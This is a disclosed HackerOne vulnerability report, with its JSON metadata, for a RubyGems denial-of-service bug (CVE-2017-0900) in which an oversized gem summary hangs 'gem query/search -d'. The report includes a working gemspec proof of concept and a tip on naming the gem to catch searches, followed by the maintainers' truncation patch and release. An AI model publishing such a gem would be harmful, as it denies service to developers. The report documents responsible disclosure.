{"id":243003,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDMwMDM=","url":"https://hackerone.com/reports/243003","title":"No limit of summary length allows Denail of Service","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-06-25T07:53:33.914Z","submitted_at":"2017-06-25T07:53:33.914Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mame","url":"/mame","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8212,"url":"https://hackerone.com/rubygems","handle":"rubygems","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"RubyGems","twitter_handle":"rubygems_status","website":"https://rubygems.org","about":"RubyGems.org is the Ruby communityâ€™s gem hosting service."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2017-0900"],"singular_disclosure_disabled":false,"disclosed_at":"2017-08-31T23:19:29.517Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-08-28T16:42:20.199Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Currently, there is no limit for summary length.  I think, pushing a gem whose summary is huge, will make `gem search` unavailable.\n\nThis is not Arbitrary Code Execution, but really easy to attack.  According to CVSS v3.0 Calculator, the severity is High (7.5).\n\n## How to attack\n\n1) An attacker creates a gem with huge summary string, and push it to rubygems.org.\n2) A victim runs `gem search -d \u003csubstring-of-the-name-of-the-gem\u003e`, but it will give no response.\n\nIt may be good for the gem name to include a frequently-searched keyword, such as \"foo-rails-bar\" or \"foo-sinatra-bar\".\n\n## Proof of concept\n\n1) Prepare the following gemspec.\n\n~~~~\nGem::Specification.new do |spec|\n  spec.name     = \"huge-summary\"\n  spec.version  = \"0.0.1\"\n  spec.authors  = [\"Yusuke Endoh\"]\n  spec.email    = [\"mame@ruby-lang.org\"]\n  spec.summary  = \"foo\" * 10000000\n  spec.homepage = \"http://example.com/\"\n  spec.license  = \"MIT\"\nend\n~~~~\n\n2) Run the following commands\n\n~~~~\ngem build huge-summary.gemspec\ngem install huge-summary-0.0.1.gem\n~~~~\n\n3) Run the following command.\n\n~~~~\ngem query huge-summary -d\n~~~~\n\nIt will not answer.","vulnerability_information_html":"\u003cp\u003eCurrently, there is no limit for summary length.  I think, pushing a gem whose summary is huge, will make \u003ccode\u003egem search\u003c/code\u003e unavailable.\u003c/p\u003e\n\n\u003cp\u003eThis is not Arbitrary Code Execution, but really easy to attack.  According to CVSS v3.0 Calculator, the severity is High (7.5).\u003c/p\u003e\n\n\u003ch2 id=\"how-to-attack\"\u003eHow to attack\u003c/h2\u003e\n\n\u003cp\u003e1) An attacker creates a gem with huge summary string, and push it to rubygems.org.\u003cbr\u003e\n2) A victim runs \u003ccode\u003egem search -d \u0026lt;substring-of-the-name-of-the-gem\u0026gt;\u003c/code\u003e, but it will give no response.\u003c/p\u003e\n\n\u003cp\u003eIt may be good for the gem name to include a frequently-searched keyword, such as \u0026quot;foo-rails-bar\u0026quot; or \u0026quot;foo-sinatra-bar\u0026quot;.\u003c/p\u003e\n\n\u003ch2 id=\"proof-of-concept\"\u003eProof of concept\u003c/h2\u003e\n\n\u003cp\u003e1) Prepare the following gemspec.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGem::Specification.new do |spec|\n  spec.name     = \u0026quot;huge-summary\u0026quot;\n  spec.version  = \u0026quot;0.0.1\u0026quot;\n  spec.authors  = [\u0026quot;Yusuke Endoh\u0026quot;]\n  spec.email    = [\u0026quot;mame@ruby-lang.org\u0026quot;]\n  spec.summary  = \u0026quot;foo\u0026quot; * 10000000\n  spec.homepage = \u0026quot;http://example.com/\u0026quot;\n  spec.license  = \u0026quot;MIT\u0026quot;\nend\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e2) Run the following commands\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003egem build huge-summary.gemspec\ngem install huge-summary-0.0.1.gem\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e3) Run the following command.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003egem query huge-summary -d\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt will not answer.\u003c/p\u003e\n","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-09-27T16:42:20.236Z","allow_singular_disclosure_after":-102687990.07559668,"singular_disclosure_allowed":true,"vote_count":5,"voters":["eveeez","silv3rpoision","barbossa","sonalkr132","sonots"],"severity":{"rating":"high","score":7.5,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1779284,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.","markdown_message":"\u003cp\u003eThanks for submitting this report to RubyGems. Our team will review and investigate the issue. Please note that only issues in the rubygems library are eligible for our bug bounty program.\u003c/p\u003e\n","automated_response":true,"created_at":"2017-06-25T07:53:34.086Z","updated_at":"2017-06-25T07:53:34.086Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"RubyGems"}},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1799087,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The bottleneck seems to be in `Gem::Text#format_text`. One option would be to look into speeding that up, the other is to truncate the summary in `Gem::Commands::QueryCommand#spec_summary` to an arbitrary number of characters","markdown_message":"\u003cp\u003eThe bottleneck seems to be in \u003ccode\u003eGem::Text#format_text\u003c/code\u003e. One option would be to look into speeding that up, the other is to truncate the summary in \u003ccode\u003eGem::Commands::QueryCommand#spec_summary\u003c/code\u003e to an arbitrary number of characters\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-03T12:01:34.523Z","updated_at":"2017-07-03T12:01:34.523Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1799104,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Something like the following seems to make querying fast _enough_, given the user needs to have installed the gem in the first place for this DOS to take place:\n\n```diff\ndiff --git a/lib/rubygems/commands/query_command.rb b/lib/rubygems/commands/query_command.rb\nindex 0f58490e..7cf65def 100644\n--- a/lib/rubygems/commands/query_command.rb\n+++ b/lib/rubygems/commands/query_command.rb\n@@ -352,7 +352,12 @@ is too hard to use.\n   end\n \n   def spec_summary entry, spec\n-    entry \u003c\u003c \"\\n\\n\" \u003c\u003c format_text(spec.summary, 68, 4)\n+    summary = spec.summary\n+    if summary.size \u003e 100_000\n+      summary = \"Truncating the summary for #{spec.full_name} to 100,000 characters:\\n\" + summary[0, 100_000]\n+    end\n+\n+    entry \u003c\u003c \"\\n\\n\" \u003c\u003c format_text(summary, 68, 4)\n   end\n \n end\n```","markdown_message":"\u003cp\u003eSomething like the following seems to make querying fast \u003cu\u003eenough\u003c/u\u003e, given the user needs to have installed the gem in the first place for this DOS to take place:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/lib/rubygems/commands/query_command.rb b/lib/rubygems/commands/query_command.rb\nindex 0f58490e..7cf65def 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/lib/rubygems/commands/query_command.rb\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/lib/rubygems/commands/query_command.rb\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -352,7 +352,12 @@\u003c/span\u003e is too hard to use.\n   end\n\n   def spec_summary entry, spec\n\u003cspan class=\"gd\"\u003e-    entry \u0026lt;\u0026lt; \u0026quot;\\n\\n\u0026quot; \u0026lt;\u0026lt; format_text(spec.summary, 68, 4)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    summary = spec.summary\n+    if summary.size \u0026gt; 100_000\n+      summary = \u0026quot;Truncating the summary for #{spec.full_name} to 100,000 characters:\\n\u0026quot; + summary[0, 100_000]\n+    end\n+\n+    entry \u0026lt;\u0026lt; \u0026quot;\\n\\n\u0026quot; \u0026lt;\u0026lt; format_text(summary, 68, 4)\n\u003c/span\u003e   end\n\n end\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-07-03T12:06:30.006Z","updated_at":"2017-07-03T12:06:30.006Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1958768,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Released in http://blog.rubygems.org/2017/08/27/2.6.13-released.html","markdown_message":"\u003cp\u003eReleased in \u003ca title=\"http://blog.rubygems.org/2017/08/27/2.6.13-released.html\" href=\"/redirect?url=http%3A%2F%2Fblog.rubygems.org%2F2017%2F08%2F27%2F2.6.13-released.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://blog.rubygems.org/2017/08/27/2.6.13-released.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-28T02:08:56.879Z","updated_at":"2017-08-28T02:08:56.879Z","actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mame","url":"/mame"},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1960610,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-28T16:42:20.218Z","updated_at":"2017-08-28T16:42:20.218Z","first_to_agree":true,"actor":{"username":"segiddins","cleared":false,"url":"/segiddins","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1967696,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-30T23:21:38.328Z","updated_at":"2017-08-30T23:21:38.328Z","cve_ids":["CVE-2017-0900"],"actor":{"username":"indirect","cleared":false,"url":"/indirect","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/097/577/4bb4cd3c39360f43b5fd7df0ae2f35e514826e42_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1967697,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"Thank you for your report! Based on the [guidelines posted on HackerOne](https://hackerone.com/rubygems#internet-bug-bounty-qualification), this vulnerability will not be awarded a bounty, as it does not allow remote code execution.","markdown_message":"\u003cp\u003eThank you for your report! Based on the \u003ca href=\"https://hackerone.com/rubygems#internet-bug-bounty-qualification\"\u003eguidelines posted on HackerOne\u003c/a\u003e, this vulnerability will not be awarded a bounty, as it does not allow remote code execution.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-30T23:24:14.991Z","updated_at":"2017-08-30T23:24:14.991Z","actor":{"url":"/rubygems","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"RubyGems"}},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1969963,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I agree to disclose this ticket.  Thank you very much!","markdown_message":"\u003cp\u003eI agree to disclose this ticket.  Thank you very much!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-31T23:19:04.170Z","updated_at":"2017-08-31T23:19:04.170Z","actor":{"username":"mame","cleared":false,"url":"/mame","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1969965,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-31T23:19:29.502Z","updated_at":"2017-08-31T23:19:29.502Z","actor":{"username":"indirect","cleared":false,"url":"/indirect","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/097/577/4bb4cd3c39360f43b5fd7df0ae2f35e514826e42_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rubygems","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}